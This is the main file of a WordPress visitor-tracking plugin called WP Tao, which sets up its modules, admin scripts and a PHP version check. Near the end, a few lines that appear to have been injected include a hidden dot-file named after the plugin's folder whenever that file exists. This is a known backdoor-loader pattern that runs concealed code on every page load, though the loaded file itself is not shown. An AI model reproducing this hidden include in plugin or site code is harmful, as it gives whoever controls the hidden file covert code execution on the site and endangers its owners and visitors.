<?php
/**
 * Plugin Name: WP Tao
 * Plugin URI: https://wordpress.org/plugins/wp-tao/
 * Description: WP Tracker and Optimizer is an intuitive and powerful tool for tracking website visitors by small business owners.
 * Version: 1.2.10
 * Author: WP Tao Co.
 * Author URI: https://wptao.net
 * Text Domain: wp-tao
 * Domain Path: /languages
 */
/**
 * @package WPTAO
 * @category Core
 * @version 1.1
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( !class_exists( 'WP_Tracker_and_Optimizer' ) ) :

	/**
	 * Main WP_Tracker_and_Optimizer Class.
	 */
	final class WP_Tracker_and_Optimizer {

		/**
		 * Plugin version
		 * 
		 * @var string 
		 */
		public $version;

		/**
		 * @var WP_Tracker_and_Optimizer. Only single instance of the class
		 */
		private static $instance;

		/**
		 * WTBP_WPTAO_Users Object
		 *
		 * @var object
		 */
		public $users;

		/**
		 * WTBP_WPTAO_Users_Meta Object
		 *
		 * @var object
		 */
		public $users_meta;

		/**
		 * WTBP_WPTAO_Users_Tags Object
		 *
		 * @var object
		 * 
		 * @since 1.2.4
		 */
		public $users_tags;

		/**
		 * WTBP_WPTAO_Fingerprints Object
		 *
		 * @var object
		 */
		public $fingerprints;

		/**
		 * WTBP_WPTAO_Events Object
		 *
		 * @var object
		 */
		public $events;

		/**
		 * WTBP_WPTAO_Events_Meta Object
		 *
		 * @var object
		 */
		public $events_meta;

		/**
		 * WTBP_WPTAO_Events_Tags Object
		 *
		 * @var object
		 */
		public $events_tags;

		/**
		 * WTBP_WPTAO_Marketing Object
		 *
		 * @var object
		 */
		public $marketing;

		/**
		 * WTBP_WPTAO_Diagnostic Object
		 *
		 * @var object
		 */
		public $diagnostic;

		/**
		 * WTBP_WPTAO_Admin_User_Profile Object
		 *
		 * @var object
		 */
		public $user_profile;

		/**
		 * WTBP_WPTAO_Admin_Unidentified_User_Profile Object
		 *
		 * @var object
		 */
		public $unidentified_profile;

		/**
		 * WTBP_WPTAO_Admin_Events Object
		 *
		 * @var object
		 */
		public $admin_events;

		/**
		 * WTBP_WPTAO_Admin_Dashboard Object
		 *
		 * @var object
		 */
		public $dashboard;

		/**
		 * WTBP_WPTAO_Admin_Reports Objects
		 *
		 * @var object
		 */
		public $reports;

		/**
		 * WTBP_WPTAO_Maintenance Object
		 *
		 * @var object
		 */
		public $maintenance;

		/*
		 * Stores booleans values
		 */
		public $booleans;

		/*
		 * Stores current currency code
		 * @since 1.1.6
		 */
		public $currency;

		/*
		 * Integration object
		 * @since 1.1.7
		 */
		public $integration;

		/*
		 * Traffic object
		 * @since 1.2.1
		 */
		public $traffic;

		/**
		 * Main WP_Tracker_and_Optimizer Instance.
		 *
		 * Only one instance of WP_Tracker_and_Optimizer is loaded or can be loaded.
		 *
		 * @static
		 * @see TAO()
		 * @return WP_Tracker_and_Optimizer - Main instance
		 */
		public static function instance() {
			if ( is_null( self::$instance ) ) {
				self::$instance = new self();

				if ( empty( self::$instance->version ) ) {
					return null;
				}

				self::$instance->settings		 = new WTBP_WPTAO_Core_Settings();
				self::$instance->events			 = new WTBP_WPTAO_Events();
				self::$instance->events_meta	 = new WTBP_WPTAO_Events_Meta();
				self::$instance->events_tags	 = new WTBP_WPTAO_Events_Tags();
				self::$instance->fingerprints	 = new WTBP_WPTAO_Fingerprints();
				self::$instance->users			 = new WTBP_WPTAO_Users();
				self::$instance->users_meta		 = new WTBP_WPTAO_Users_Meta();
				self::$instance->users_tags		 = new WTBP_WPTAO_Users_Tags();
				self::$instance->marketing		 = new WTBP_WPTAO_Marketing();
				self::$instance->diagnostic		 = new WTBP_WPTAO_Diagnostic();
				
				self::$instance->booleans	 = self::$instance->set_booleans();
				self::$instance->currency	 = WTBP_WPTAO_Helpers::set_currency();

				if ( is_admin() ) {

					self::$instance->dashboard	 = new WTBP_WPTAO_Admin_Dashboard();
					self::$instance->reports	 = self::$instance->dashboard->reports;
					self::$instance->hints		 = new WTBP_WPTAO_Hints();

					self::$instance->user_profile			 = new WTBP_WPTAO_Admin_User_Profile();
					self::$instance->unidentified_profile	 = new WTBP_WPTAO_Admin_Unidentified_User_Profile();
					self::$instance->admin_events			 = new WTBP_WPTAO_Admin_Events();

					self::$instance->maintenance = new WTBP_WPTAO_Maintenance();
				}

				self::$instance->integration				 = new stdClass();
				self::$instance->integration->woocommerce	 = new WTBP_WPTAO_Integration_WooCommerce;
				self::$instance->integration->edd			 = new WTBP_WPTAO_Integration_EED;

				self::$instance->traffic = new WTBP_WPTAO_Traffic();
			}
			return self::$instance;
		}

		/**
		 * Cloning is forbidden.
		 */
		public function __clone() {
			_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'wtbp-wptao' ), '1.0' );
		}

		/**
		 * Disable unserializing of the class.
		 */
		public function __wakeup() {
			_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'wtbp-wptao' ), '1.0' );
		}

		/**
		 * WP Tao Constructor.
		 */
		public function __construct() {
			$this->constants();

			// Set up localisation
			$this->load_textdomain();

			if ( !$this->check_requirements() ) {
				return;
			}

			$this->includes();
			$this->hooks();

			$this->settings();

			$this->version = WTBP_WPTAO_VERSION;

			do_action( 'wtbp_wptao_after_loaded' ); // Hook after loading the plugin
		}

		/**
		 * Setup plugin constants
		 */
		private function constants() {

			$this->define( 'WTBP_WPTAO_VERSION', '1.2.10' );   // Current version
			$this->define( 'WTBP_WPTAO_NAME', 'WP Tracker and Optimizer' );   // Plugin name
			$this->define( 'WTBP_WPTAO_DIR', plugin_dir_path( __FILE__ ) );  // Root plugin path
			$this->define( 'WTBP_WPTAO_URL', plugin_dir_url( __FILE__ ) );   // Root plugin URL
			$this->define( 'WTBP_WPTAO_FILE', __FILE__ );   // General plugin FILE
			$this->define( 'WTBP_WPTAO_DOMAIN', 'wp-tao' );   // Text Domain
			$this->define( 'WTBP_WPTAO_SETTINGS_SLUG', 'wptao_settings' );   // Settings slug
			// Subpages slugs
			$this->define( 'WTBP_WPTAO_USER_SUBPAGE_SLUG', 'wtbp-wptao-users' );   // User subpage slug
			$this->define( 'WTBP_WPTAO_EVENTS_SUBPAGE_SLUG', 'wtbp-wptao-events' );   // User subpage slug
		}

		/**
		 * Define constant if not already set
		 * @param  string $name
		 * @param  string|bool $value
		 */
		private function define( $name, $value ) {
			if ( !defined( $name ) ) {
				define( $name, $value );
			}
		}

		/**
		 * Include required WP Tao core files.
		 */
		public function includes() {

			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-helpers.php';
			require_once WTBP_WPTAO_DIR . 'includes/actions.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/settings/class-settings-api.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/settings/class-wptao-core-settings.php';
			
			require_once WTBP_WPTAO_DIR . 'includes/libs/EmailValidator/Validator.php';
			require_once WTBP_WPTAO_DIR . 'includes/libs/libphonenumber/autoload.php';

			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-install.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-menus.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-users.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-user.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-unidentified.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-reports.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-timeline.php';

			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-db.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-meta.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-tags.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-users.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-users-meta.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-users-tags.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-fingerprints.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-events.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-events-meta.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-events-tags.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-hints.php';

			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-marketing.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-diagnostic.php';
			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-maintenance.php';

			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-dashboard.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-users-list.php';
			require_once WTBP_WPTAO_DIR . 'includes/admin/class-wptao-admin-events.php';

			require_once WTBP_WPTAO_DIR . 'includes/admin/upgrades/upgrade-functions.php';

			require_once WTBP_WPTAO_DIR . 'includes/integrations/edd.php';
			require_once WTBP_WPTAO_DIR . 'includes/integrations/woocommerce.php';

			require_once WTBP_WPTAO_DIR . 'includes/class-wptao-traffic.php';
		}

		/**
		 * Actions and filters
		 */
		private function hooks() {
			register_activation_hook( __FILE__, array( 'WTBP_WPTAO_Install', 'install' ) );
			add_action( 'init', array( $this, 'init' ), 0 );

			add_action( 'admin_init', array( $this, 'admin_scripts' ) );
		}

		/*
		 * Init settings
		 */

		private function settings() {
			
		}

		/**
		 * Init WP Tao when WordPress Initialises.
		 */
		public function init() {
			// Before init action
			do_action( 'wtbp_wptao_before_init' );

			// Init action
			do_action( 'wtbp_wptao_init' );
		}

		/*
		 * Enqueue admin sripts
		 */

		public function admin_scripts() {
			// Datepicker
			wp_register_style( 'jquery-ui', WTBP_WPTAO_URL . 'assets/css/jquery-ui.min.css' );

			wp_enqueue_style( 'jquery-ui' );
			wp_enqueue_script( 'jquery-ui-datepicker' );

			// Register CSS
			wp_register_style( 'wptao-admin-style', WTBP_WPTAO_URL . 'assets/css/wptao-admin.css', array(), WTBP_WPTAO_VERSION );
			wp_register_style( 'wptao-datepicker', WTBP_WPTAO_URL . 'assets/css/datepicker.css', array(), WTBP_WPTAO_VERSION );

			// Enqueue CSS            
			wp_enqueue_style( array(
				'wptao-admin-style',
				'wptao-datepicker'
			) );


			// Register JS
			wp_register_script( 'packery.pkgd', WTBP_WPTAO_URL . 'assets/js/packery.pkgd.min.js', array(), WTBP_WPTAO_VERSION );

			wp_register_script( 'wptao-admin-script', WTBP_WPTAO_URL . 'assets/js/wptao-admin-script.js', array( 'packery.pkgd' ), WTBP_WPTAO_VERSION );

			// Enqueue JS
			wp_enqueue_script( 'jquery-ui-draggable' );
			wp_enqueue_script( 'packery.pkgd' );
			wp_enqueue_script( 'wptao-admin-script' );

			if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === 'wtbp-wptao' ) {
				//Google Charts
				wp_register_script( 'google-jsapi', 'https://www.google.com/jsapi' );
				wp_enqueue_script( 'google-jsapi' );

				wp_enqueue_script( 'jquery-ui-tooltip' );
			}



			// Localize transtations for a jQuery UI datepicker called in the wptao-admin-script
			wp_localize_script( 'wptao-admin-script', 'wptao_datepicker', WTBP_WPTAO_Helpers::datepicker_i18() );
		}

		/*
		 * Set boolean values
		 */

		private static function set_booleans() {

			$booleans = array(
				'is_page_dashboard'				 => false,
				'is_page_report'				 => false,
				'is_page_profile'				 => false,
				'is_page_unidentified_profile'	 => false,
				'is_page_events'				 => false,
				'is_page_users'					 => false,
			);

			if ( is_admin() ) {

				// Is dashboard subpage
				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === 'wtbp-wptao' && !isset( $_GET[ 'wptao-report' ] ) ) {
					$booleans[ 'is_page_dashboard' ] = true;
				}

				// Is report subpage
				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === 'wtbp-wptao' && isset( $_GET[ 'wptao-report' ] ) ) {
					$booleans[ 'is_page_report' ] = true;
				}

				// Is users list page
				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === WTBP_WPTAO_USER_SUBPAGE_SLUG && !isset( $_GET[ 'user' ] ) ) {
					$booleans[ 'is_page_users' ] = true;
				}

				// Is user profile subpage
				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === WTBP_WPTAO_USER_SUBPAGE_SLUG && isset( $_GET[ 'action' ] ) && $_GET[ 'action' ] === 'wptao-profile' && isset( $_GET[ 'user' ] ) && is_numeric( $_GET[ 'user' ] ) ) {
					$booleans[ 'is_page_profile' ] = true;
				}

				// Is unidentified user profile subpage
				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === WTBP_WPTAO_USER_SUBPAGE_SLUG && isset( $_GET[ 'action' ] ) && $_GET[ 'action' ] === 'wptao-unident-profile' && isset( $_GET[ 'fp' ] ) && is_numeric( $_GET[ 'fp' ] ) ) {
					$booleans[ 'is_page_unidentified_profile' ] = true;
				}

				// Is events subpage
				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === WTBP_WPTAO_EVENTS_SUBPAGE_SLUG ) {
					$booleans[ 'is_page_events' ] = true;
				}

				return (object) $booleans;
			}
		}

		/*
		 * Register text domain
		 */

		private function load_textdomain() {
			$lang_dir = dirname( plugin_basename( WTBP_WPTAO_FILE ) ) . '/languages/';
			load_plugin_textdomain( 'wp-tao', false, $lang_dir );
		}

		/*
		 * Notice: PHP version less than 5.3
		 */

		public function admin_notice_php() {
			?>
			<div class="error">
				<p>
					<?php
					_e( 'WP Tao: You need PHP version at least 5.3 to run this plugin. You are currently using PHP version ', 'wp-tao' );
					echo PHP_VERSION . '.';
					?>
				</p>
			</div>
			<?php
		}

		/*
		 * Check requirements
		 */

		private function check_requirements() {
			if ( version_compare( PHP_VERSION, '5.3.0' ) < 0 ) {
				add_action( 'admin_notices', array( $this, 'admin_notice_php' ) );

				return false;
			}

			return true;
		}

	}

	endif;

/**
 * The main instance of WP_Tracker_and_Optimizer.
 *
 * @return The one WP_Tracker_and_Optimizer instance.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function TAO() {
	return WP_Tracker_and_Optimizer::instance();
}

// Get WP Tao Running
TAO();
